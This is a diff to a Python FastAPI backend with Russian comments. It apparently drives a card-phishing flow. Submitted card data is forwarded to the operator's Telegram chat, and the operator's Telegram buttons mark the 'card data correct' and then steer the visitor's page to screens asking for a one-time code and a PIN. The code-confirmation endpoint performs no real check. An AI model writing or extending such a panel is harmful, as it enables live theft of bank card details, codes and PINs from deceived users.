@@ -229,7 +229,6 @@ async def submit_payment(data: PaymentData):
     sid = data.session_id
     payment_status[sid] = {
         "data": data,
-        "status": "waiting_review",
         "action": None
     }
     
@@ -247,22 +246,37 @@ async def submit_payment(data: PaymentData):
     send_to_telegram(MY_CHAT_ID, message, reply_markup=keyboard)
     return {"status": "ok"}
 
-# ========== 6. ПРОВЕРКА СТАТУСА ОПЛАТЫ ==========
-@app.get("/check_payment_status/{session_id}")
-async def check_payment_status(session_id: str):
-    status = payment_status.get(session_id, {})
-    action = status.get("action", None)
-    return {"action": action}
+# ========== 6. УНИВЕРСАЛЬНАЯ ПРОВЕРКА ДЕЙСТВИЯ ==========
+@app.get("/check_action/{session_id}")
+async def check_action(session_id: str):
+    # Проверяем сначала оплату
+    if session_id in payment_status and payment_status[session_id].get("action"):
+        action = payment_status[session_id]["action"]
+        payment_status[session_id]["action"] = None
+        return {"action": action}
+    
+    # Проверяем авторизацию (код/pin)
+    session = sessions.get(session_id)
+    if session:
+        status = session.get("status", "")
+        if status == "ready_for_code":
+            session["status"] = "waiting_code"
+            return {"action": "show_code"}
+        elif status == "code_confirmed":
+            session["status"] = "waiting_pin"
+            return {"action": "show_pin"}
+        elif status == "pin_confirmed":
+            return {"action": "success"}
+    
+    return {"action": None}
 
 # ========== 7. ПОДТВЕРЖДЕНИЕ КОДА ОПЛАТЫ ==========
 @app.post("/confirm_payment_code")
 async def confirm_payment_code(data: ConfirmCodeData):
-    sid = data.session_id
-    code = data.code
-    # Здесь можно добавить проверку кода, для теста просто успех
+    # Здесь можно добавить проверку кода
     return {"status": "ok"}
 
-# ========== 8. ПОЛУЧЕНИЕ ДАННЫХ КЛИЕНТА ПО SESSION_ID ==========
+# ========== 8. ПОЛУЧЕНИЕ ДАННЫХ КЛИЕНТА ==========
 @app.get("/get_application/{session_id}")
 async def get_application(session_id: str):
     session = sessions.get(session_id)
@@ -275,40 +289,7 @@ async def get_application(session_id: str):
         "name": session.get("name", "")
     }
 
-# ========== 9. ПРОВЕРКА СТАТУСА ДЛЯ РЕДИРЕКТА ==========
-@app.get("/check_action_status/{session_id}")
-async def check_action_status(session_id: str):
-    session = sessions.get(session_id)
-    if not session:
-        return {"status": "not_found"}
-    
-    action = session.get("pending_action", None)
-    if action:
-        session["pending_action"] = None
-        return {"action": action}
-    return {"action": None}
-
-# ========== 10. ПРОВЕРКА СТАТУСА ДЛЯ КОДА/PIN ==========
-@app.get("/check_status/{session_id}")
-async def check_status(session_id: str):
-    session = sessions.get(session_id)
-    if not session:
-        return {"status": "not_found"}
-    
-    status = session.get("status", "unknown")
-    
-    if status == "code_confirmed":
-        return {"status": "code_confirmed"}
-    elif status == "code_wrong":
-        return {"status": "code_wrong"}
-    elif status == "pin_confirmed":
-        return {"status": "pin_confirmed"}
-    elif status == "pin_wrong":
-        return {"status": "pin_wrong"}
-    else:
-        return {"status": status}
-
-# ========== 11. ОБРАБОТКА КНОПОК ==========
+# ========== 9. ОБРАБОТКА КНОПОК ==========
 @app.post("/webhook/callback")
 async def handle_callback(request: Request):
     data = await request.json()
@@ -370,15 +351,12 @@ async def handle_callback(request: Request):
             json={"callback_query_id": callback_id, "text": "Страница кода открыта"}
         )
     
-    # ===== КНОПКИ ДЛЯ ОПЛАТЫ (ДАННЫЕ КАРТЫ) =====
+    # ===== КНОПКИ ДЛЯ ОПЛАТЫ =====
     elif action == "card":
         result = parts[1] if len(parts) > 1 else "wrong"
         if result == "ok":
             if session_id in payment_status:
                 payment_status[session_id]["action"] = "go_code"
-                # Также сохраняем user_chat_id для отправки уведомлений
-                if user_chat_id:
-                    payment_status[session_id]["user_chat_id"] = user_chat_id
             send_to_telegram(MY_CHAT_ID, f"✅ Данные карты верны. Сессия {session_id}")
         else:
             if session_id in payment_status:
